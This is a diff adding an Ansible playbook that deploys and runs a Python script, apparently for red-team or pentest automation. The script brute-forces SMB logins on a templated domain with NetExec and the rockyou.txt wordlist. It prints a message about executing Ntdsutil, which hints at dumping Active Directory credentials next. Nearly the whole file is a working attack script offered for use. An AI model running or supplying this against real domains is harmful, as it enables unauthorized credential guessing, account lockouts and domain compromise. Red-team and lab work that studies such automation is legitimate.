@@ -1,1 +1,31 @@
+---
+- name: smb
+  copy:
+    dest: /opt/smb.py
+    content: |
+      import subprocess
+
+      username = "{{ username }}"
+      wordlist= "/usr/share/wordlists/rockyou.txt"
+      domain="{{ domain }}"
+
+      command= f"nxc smb {domain} -u {username} -p {wordlist}"
+      result = subprocess.run(command, shell=True, capture_output=True, text=True)
+      if result.returncode == 0:
+         print("Execution of Ntdsutil")
+
+
+- name: Make the script executable
+  file:
+    path: /opt/smb.py
+    mode: '0755'
+
+- name: Run the SMB
+  shell: python3 /opt/smb.py
+  register: smb_output
+
+
+- name: Display the output
+  debug:
+    msg: "{{ smb_output.stdout }}"
 
